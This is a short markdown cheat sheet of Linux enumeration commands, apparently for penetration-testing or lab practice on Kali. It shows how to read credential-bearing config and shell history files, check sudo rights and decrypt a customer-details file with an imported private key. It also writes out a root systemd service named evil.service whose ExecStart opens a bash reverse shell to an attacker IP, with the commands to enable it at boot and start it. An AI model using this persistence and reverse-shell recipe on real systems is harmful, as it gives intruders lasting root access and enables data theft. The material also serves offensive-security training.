# Useful Commands
Handy commands for enumeration and system interaction

## View file content
```bash copy
less secret.txt
```
- Views `secret.txt` in a scrollable pager for easy reading.

## Display web configuration
```bash copy
cat /var/www/html/configuration.php
```
- Shows content of `configuration.php` (e.g., for web apps like Joomla).

## View command history
```bash copy
cat ~/.*history
```
- Displays user’s command history files (e.g., `.bash_history`).

```bash copy
less
```
- Pipes history output to a scrollable pager for easier viewing.

## List sudo permissions
```bash copy
sudo -l
```
- Lists commands the current user can run with `sudo`.
- `-l`: List allowed commands.

## Import GPG key
```bash copy
gpg --import proiv.key
```
- Imports a GPG private key for decryption.
- `--import`: Imports the key file `proiv.key`.

## Decrypt GPG file
```bash copy
gpg --decrypt CustomerDetails.xlsx.gpg
```
- Decrypts the GPG-encrypted file `CustomerDetails.xlsx.gpg`.
- `--decrypt`: Decrypts the file.

```bash copy
> decrypted.xlsx
```
- Redirects decrypted output to `decrypted.xlsx`.
- **Cipher decryption resource**: [Boxentriq - Cipher Decryption Tools](https://boxentriq.com/)

## Create malicious systemd service
```bash copy
nano /tmp/evil.service
```
- Opens `nano` to create or edit `evil.service` in `/tmp`.

### Systemd service file
```
[Unit]
Description=This is not the evil service you are looking for...

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

[Install]
WantedBy=multi-user.target
```
- Defines a systemd service that runs a reverse shell as root.
- `Type=simple`: Basic service type.
- `User=root`: Runs as root.
- `ExecStart`: Executes a reverse shell to attacker IP 10.10.10.10 and port 1234.
- `WantedBy=multi-user.target`: Activates during multi-user boot.

### Enable systemd service
```bash copy
/bin/systemctl enable /tmp/evil.service
```
- Enables the `evil.service` to run at boot.
- `enable`: Links service to startup.

### Start systemd service
```bash copy
/bin/systemctl start evil
```
- Starts the `evil` service immediately.
- `start`: Runs the service.

### Linux Filesystem Hierarchy (FHS) - Kali Linux

| Directory     | Description |
|---------------|-------------|
| `/bin/`       | Basic programs and essential user command binaries. |
| `/boot/`      | Kali Linux kernel and other files required for its early boot process. |
| `/dev/`       | Device files (representing hardware devices). |
| `/etc/`       | System-wide configuration files. |
| `/home/`      | User's personal files and home directories. |
| `/lib/`       | Basic shared libraries and kernel modules. |
| `/media/`     | Mount points for removable media (CD/DVD-ROM, USB keys, etc.). |
| `/mnt/`       | Temporary mount point for mounting filesystems manually. |
| `/opt/`       | Optional / extra applications provided by third parties. |
| `/root/`      | Administrator's (root) personal files. |
| `/run/`       | Volatile runtime data that does not persist across reboots. |
| `/sbin/`      | System administration programs (system binaries). |
| `/srv/`       | Data used by services hosted on this system. |
| `/tmp/`       | Temporary files (often emptied at boot). |
| `/usr/`       | User applications and utilities. Further subdivided into `bin/`, `sbin/`, `lib/`, etc.<br>`/usr/share/` contains architecture-independent data.<br>`/usr/local/` is for manually installed applications by the administrator. |
| `/var/`       | Variable data handled by services (logs, queues, spools, caches, etc.). |
| `/proc/`      | Virtual filesystem used by the kernel to export data to user space (not part of FHS). |
| `/sys/`       | Virtual filesystem for kernel and device information (not part of FHS). |